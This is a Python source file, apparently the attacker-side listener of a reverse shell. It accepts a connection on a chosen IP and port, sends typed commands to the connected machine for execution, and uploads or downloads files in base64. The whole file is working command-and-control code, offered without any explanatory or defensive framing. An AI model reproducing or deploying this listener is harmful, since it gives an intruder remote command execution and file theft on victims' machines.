import socket
import optparse
import simplejson
import base64

class SocketListener():
    def __init__(self):
        userInput = self.getUserInput()
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((userInput.ip, int(userInput.port)))
        listener.listen(0)
        print("Listening...")
        (self.connection, address) = listener.accept()
        print("Connection OK from " + str(address))

    def jsonSend(self, data):
        jsonData = simplejson.dumps(data)
        self.connection.send(jsonData.encode("utf-8"))

    def jsonReceive(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.connection.recv(1024).decode()
                return simplejson.loads(jsonData)
            except ValueError:
                continue

    def commandExecution(self, commandInput):
        self.jsonSend(commandInput)

        if commandInput[0].lower() == "quit":
            self.connection.close()
            exit()

        return self.jsonReceive()

    def saveFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Download OK"

    def getFileContents(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def startListener(self):
        while True:
            commandInput = input("Enter command: ")
            commandInput = commandInput.split(" ")
            try:
                if commandInput[0] == "upload":
                    fileContent = self.getFileContents(commandInput[1])
                    commandInput.append(fileContent)
                commandOutput = self.commandExecution(commandInput)
                if (commandInput[0] == "download") and ("Error!" not in commandOutput):
                    commandOutput = self.saveFile(commandInput[1], commandOutput)
            except Exception:
                commandOutput = "Error!!"
            print(commandOutput)

    def getUserInput(self):
        parseObject = optparse.OptionParser()
        parseObject.add_option("-i", "--ip", dest="ip", help="ip address to connect")
        parseObject.add_option("-p", "--port", dest="port", help="port address to connect")
        (userInput, arguments) = parseObject.parse_args()
        if not (userInput.ip and userInput.port):
            raise ValueError("Enter the ip and port address to connect. (-i -p *required)")
        return userInput

socketListenerObj = SocketListener()
socketListenerObj.startListener()